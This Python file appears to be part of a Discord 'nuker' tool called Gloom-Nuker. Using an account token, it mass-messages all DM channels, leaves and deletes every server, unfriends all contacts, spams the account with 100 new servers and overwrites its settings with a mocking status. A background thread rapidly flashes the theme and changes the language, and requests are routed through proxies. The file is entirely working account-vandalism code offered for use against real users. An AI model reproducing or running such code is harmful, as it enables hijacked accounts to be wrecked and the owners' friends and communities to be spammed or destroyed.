import threading
import requests
import Gloom
import random

from itertools import cycle
from colorama import Fore

from func.plugins.common import SlowPrint, setTitle, getheaders, proxy

def Gloom_Nuke(token, Server_Name, message_Content):
    setTitle("Glooming the account")
    print(f"{Fore.RESET}[{Fore.BLUE}*{Fore.RESET}] {Fore.BLUE}Releasing the gloom. . .")
    if threading.active_count() <= 100:
        t = threading.Thread(target=CustomSeizure, args=(token, ))
        t.start()

    headers = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
            proxies=proxy(),
            headers=headers,
            data={"content": f"{message_Content}"})
            setTitle(f"Messaging "+channel['id'])
            print(f"{Fore.BLUE}messaged id: {Fore.WHITE}"+channel['id']+Fore.RESET)
        except Exception as e:
            print(f"error has been encountered and is being ignored: {e}")
    print(f"{Fore.BLUE}message sent to all friends.{Fore.RESET}\n")
    
    guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], proxies=proxy(), headers={'Authorization': token})
            print(f"{Fore.YELLOW}left guild: {Fore.WHITE}"+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"error has been encountered and is being ignored: {e}")

    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], proxies=proxy(), headers={'Authorization': token})
            print(f'{Fore.BLUE}deleted guild: {Fore.WHITE}'+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"error has been encountered and is being ignored: {e}")
    print(f"{Fore.YELLOW}deleted all available servers.{Fore.RESET}\n")

    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies=proxy(), headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], proxies=proxy(), headers=getheaders(token))
            setTitle(f"Removing friend: "+friend['user']['username']+"#"+friend['user']['discriminator'])
            print(f"{Fore.GREEN}Removed friend: {Fore.WHITE}"+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print(f"{Fore.GREEN}Removed all available friends.{Fore.RESET}\n")
    
    for i in range(100):
        try:
            payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
            requests.post('https://discord.com/api/v7/guilds', proxies=proxy(), headers=getheaders(token), json=payload)
            setTitle(f"Creating {Server_Name} #{i}")
            print(f"{Fore.BLUE}Created {Server_Name} #{i}.{Fore.RESET}")
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print(f"{Fore.BLUE}Created all servers.{Fore.RESET}\n")
    t.do_run = False
    requests.delete("https://discord.com/api/v8/hypesquad/online", proxies=proxy(), headers=getheaders(token))
    setting = {
          'theme': "light",
          'locale': "ja",
          'message_display_compact': False,
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'enable_tts_command': False,
          'explicit_content_filter': '0',
          "custom_status": {"text": "I got shit on by https://github.com/Rdimo/Gloom-Nuker"},
          'status': "idle"
    }
    requests.patch("https://discord.com/api/v7/users/@me/settings", proxies=proxy(), headers=getheaders(token), json=setting)
    j = requests.get("https://discordapp.com/api/v9/users/@me", proxies=proxy(), headers=getheaders(token)).json()
    a = j['username'] + "#" + j['discriminator']
    setTitle(f"Gloom Nuke Successfully Detonated!")
    SlowPrint(f"{Fore.GREEN}Succesfully turned {a} into a Gloomous Wasteland ")
    print("Enter anything to continue. . . ", end="")
    input()
    Gloom.main()

def CustomSeizure(token):
    print(f'{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n')
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        modes = cycle(["light", "dark"])
        #cycle between light/dark mode and languages
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v7/users/@me/settings", proxies=proxy(), headers=getheaders(token), json=setting)